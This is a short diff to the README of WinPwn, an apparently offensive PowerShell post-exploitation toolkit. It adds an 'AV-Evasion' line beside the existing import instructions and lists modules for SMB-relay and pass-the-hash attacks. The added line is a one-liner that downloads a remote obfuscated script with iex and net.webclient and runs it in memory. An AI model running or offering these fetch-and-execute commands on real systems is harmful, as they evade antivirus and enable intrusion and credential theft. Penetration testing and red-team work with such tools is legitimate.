@@ -10,6 +10,9 @@ Just Import the Modules with:
 `Import-Module .\WinPwn_v0.7.ps1` or 
 `iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn_v0.7.ps1')`
 
+For AV-Evasion use:
+`iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/ObfusWinPwn.ps1')`
+
 Functions available after Import:
 * #### `WinPwn` -> Guides the user through all functions/Modules with simple questions.
 * #### `Inveigh` -> Executes Inveigh in a new Console window , SMB-Relay attacks with Session management (Invoke-TheHash) integrated
